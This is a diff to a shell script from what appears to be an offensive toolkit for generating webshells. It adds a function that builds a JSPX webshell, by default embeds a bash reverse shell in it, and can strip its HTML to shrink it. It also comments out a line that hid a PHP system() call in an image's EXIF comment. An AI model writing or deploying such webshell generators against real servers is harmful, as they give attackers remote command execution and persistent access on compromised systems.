@@ -305,6 +305,29 @@ create_jsp_webshell() {
     fi
 }
 
+create_jspx_webshell() {
+    if [[ -z $webshell_filename ]]; then
+        webshell_filename="webshell.jspx"
+    fi
+    cp $SCRIPTDIR/../jsp/webshell.jspx "$webshell_filename"
+    if [ -z "$cmd" ]; then
+        reverse_type="java_exec"
+        cmd=$(get_bash_reverse_shell)
+    fi
+    local cmd_replacement=$(escape_sed "$cmd")
+    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
+    sed -E -i "s/\{cmd\}/$cmd_replacement/g" "$webshell_filename"
+    
+    if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
+        sed -E -i '/html/d' "$webshell_filename"
+        sed -E -i '/body/d' "$webshell_filename"
+        sed -E -i '/title/d' "$webshell_filename"
+        sed -E -i '/head/d' "$webshell_filename"
+        sed -E -i '/pre/d' "$webshell_filename"
+        sed -E -i '/h1/d' "$webshell_filename"
+    fi
+}
+
 create_image_webshell() {
     if [[ -z $webshell_filename ]]; then
         webshell_filename="webshell.php.jpg"
@@ -317,7 +340,7 @@ create_image_webshell() {
     else
         command="'$cmd'"
     fi
-    exiftool -Comment="<?php system($command); ?>" "$webshell_filename"
+    #exiftool -Comment="<?php system($command); ?>" "$webshell_filename"
 }
 
 create_image_gif_webshell() {
